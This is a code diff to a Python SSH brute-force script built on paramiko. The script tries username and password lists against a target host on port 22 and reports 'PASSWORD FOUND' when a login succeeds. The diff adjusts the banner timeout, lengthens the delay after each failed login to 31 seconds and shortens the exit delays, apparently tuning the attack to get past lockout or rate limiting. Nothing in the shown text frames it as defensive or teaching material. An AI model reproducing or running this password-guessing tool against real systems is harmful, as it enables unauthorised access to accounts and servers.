@@ -48,13 +48,14 @@ def attack():
             print("ATTACKING..")
             print("[*] Username:", str(usr_arr[u]))
             print("[*] Password:", str(pass_arr[x]))
-            client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22, timeout=45, banner_timeout=160)
+            client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22, timeout=45, banner_timeout=180)
             print(termcolor.colored("[*} PASSWORD FOUND!\n", 'cyan'))
             print(termcolor.colored("[*}", (str(pass_arr[x])), "\n", 'cyan'))
             break
         except paramiko.ssh_exception.AuthenticationException:
             print(termcolor.colored("[X] PASSWORD NOT FOUND!\n", 'red'));
-            time.sleep(15)
+            print("Wait 31s.....")
+            time.sleep(31)
             if x == len(pass_arr) - 1:
                 x = 0
                 if u == len(usr_arr) - 1:    break
@@ -65,12 +66,12 @@ def attack():
         except paramiko.ssh_exception.NoValidConnectionsError:
             print(termcolor.colored("Error\n", 'red'))
             print("QUITTING.....")
-            time.sleep(15)
+            time.sleep(5)
             quit()
         except paramiko.ssh_exception.SSHException:
             print(termcolor.colored("CANNOT CONNECT\n", 'red'))
             print("QUITTING.....")
-            time.sleep(15)
+            time.sleep(5)
             quit()
 
         except:
